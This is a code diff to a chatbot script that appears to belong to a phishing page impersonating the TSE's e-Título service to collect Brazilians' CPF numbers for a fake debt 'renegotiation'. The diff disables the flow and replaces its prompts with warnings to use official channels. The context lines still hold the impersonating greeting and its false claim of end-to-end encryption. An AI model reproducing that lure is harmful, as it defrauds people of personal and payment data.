@@ -2212,11 +2212,13 @@
   }
 
   async function startFlow() {
-    if (!NOME || !CPF) {
-      addSystem('<em>(Dados de identificação ausentes. Redirecionando para a consulta...)</em>');
-      setTimeout(function () { window.location.href = '../consulta/'; }, 1800);
-      return;
-    }
+  addSystem('<em>Por segurança, este atendimento foi desativado e não coleta CPF, dados pessoais ou pagamentos. Consulte diretamente os canais oficiais do órgão responsável.</em>');
+  return;
+
+  if (!NOME || !CPF) {
+  addSystem('<em>Para sua segurança, este atendimento não solicita CPF nem outros dados pessoais. Consulte diretamente os canais oficiais do órgão responsável.</em>');
+  return;
+  }
 
     var primeiroNome = NOME_COMPLETO.split(' ')[0];
     await botSay('Olá <strong>' + primeiroNome + '</strong>, seja bem vindo(a) ao canal oficial de atendimento do <strong>e-Título</strong> disponibilizado pelo <strong>TSE - Tribunal Superior Eleitoral</strong>. Seus dados estão protegidos sob sigilo e criptografia de ponta a ponta.');
@@ -2247,10 +2249,9 @@
         addUser(label);
         if (label.indexOf('Sim') === 0) continueFlow();
         else { 
-          setTimeout(async function () { 
-            await botSay('Por favor, informe o CPF correto para prosseguir com a renegociação.'); 
-            setTimeout(function(){ window.location.href = '../consulta/'; }, 1500); 
-          }, 600); 
+  setTimeout(async function () {
+  await botSay('Não é possível validar dados pessoais neste atendimento. Para sua segurança, use apenas os canais oficiais do órgão responsável.');
+  }, 600);
         }
       };
       btnsConfirm.appendChild(btn);
